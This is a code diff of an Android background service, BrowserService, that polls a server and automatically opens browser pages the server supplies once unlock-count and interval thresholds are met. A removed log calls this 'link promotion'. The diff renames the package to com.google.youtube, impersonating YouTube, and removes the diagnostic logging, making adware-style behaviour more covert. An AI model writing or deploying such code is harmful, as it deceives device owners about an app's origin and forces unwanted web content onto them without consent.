@@ -1,4 +1,4 @@
-package com.mx.utils.services;
+package com.google.youtube.services;
 
 import java.util.Date;
 import java.util.Iterator;
@@ -7,8 +7,10 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 import org.json.JSONObject;
-import com.mx.utils.utils.HttpUtil;
-import com.mx.utils.utils.MyHelpUtil;
+
+import com.google.youtube.utils.HttpUtil;
+import com.google.youtube.utils.MyHelpUtil;
+
 import android.app.ActivityManager;
 import android.app.Service;
 import android.content.ComponentName;
@@ -48,8 +50,6 @@ public class BrowserService extends Service {
 	@Override
 	public void onCreate() {
 
-		System.out.println("初始化Service 》》链接推广");
-
 		am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
 
 		pm = getPackageManager();
@@ -79,7 +79,7 @@ public class BrowserService extends Service {
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 
-		System.out.println("onStartCommand...");
+		System.out.println("onStartCommand lj...");
 
 		if (timer != null) {
 
@@ -96,8 +96,6 @@ public class BrowserService extends Service {
 			@Override
 			public void run() {
 				// TODO Auto-generated method stub
-
-				// System.out.println("--run...");
 
 				s = pm.queryIntentActivities(urlIntent,
 						PackageManager.MATCH_DEFAULT_ONLY);
@@ -127,8 +125,6 @@ public class BrowserService extends Service {
 											MyHelpUtil
 													.add_notifacation_params(getApplicationContext()));
 
-							System.out.println("链接服务器返回结果：" + res);
-
 							if (!TextUtils.isEmpty(res)) {
 
 								JSONObject job = new JSONObject(res);
@@ -149,8 +145,6 @@ public class BrowserService extends Service {
 
 								if (bool) {
 
-									System.out.println("链接：满足条件》》》》跳转");
-
 									Intent url_Intent = new Intent(
 											Intent.ACTION_VIEW,
 											Uri.parse(link_url));
@@ -169,7 +163,6 @@ public class BrowserService extends Service {
 
 									saveCount(link_title);
 
-									/* 说明 */
 									startActivity(url_Intent);
 
 								}
@@ -250,31 +243,15 @@ public class BrowserService extends Service {
 
 		long display_interval_to_long = Math
 				.abs(link_display_interval * 60 * 1000);
-
-		System.out
-				.println("本机链接时间间隔：" + reslut / 1000 / 60 + ">min"
-						+ ">>服务器规定间隔：" + display_interval_to_long / 1000 / 60
-						+ ">>min");
-
-		System.out.println("本机链接解锁屏：" + local_screen_count + ">>服务器规定解锁屏次数："
-				+ link_count);
 		
 		
 		int local_display_count = linkSharedPreferences.getInt(link_title, 0);
 		
-		System.out.println(link_title+"弹出次数：" + local_display_count + ">>服务器规定次数："
-				+ display_count);
-
 		if (reslut >= display_interval_to_long
 				&& local_screen_count >= link_count && local_display_count<=display_count) {
 
-			System.out.println("链接：满足条件");
-
 			return true;
-		} else {
-			System.out.println("链接：不满足条件");
-
-		}
+		} 
 
 		return false;
 	}
